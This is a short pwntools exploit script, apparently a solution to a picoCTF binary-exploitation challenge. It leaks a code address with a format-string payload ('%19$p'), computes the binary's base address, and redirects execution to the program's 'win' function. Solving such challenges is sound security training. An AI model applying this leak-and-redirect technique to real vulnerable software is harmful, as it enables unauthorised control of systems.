#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 57187
HOST = "rescued-float.picoctf.net"
exe = context.binary = ELF('./vuln', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*call_functions+80
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

fmt = b"%19$p"
# GDB()
p.sendlineafter(b"name:", fmt)
exe_leak = int(p.recvline()[:-1], 16)
exe.address = exe_leak - 0x1441

p.sendlineafter(b"0x12345: ", hex(exe.sym.win))

p.interactive()
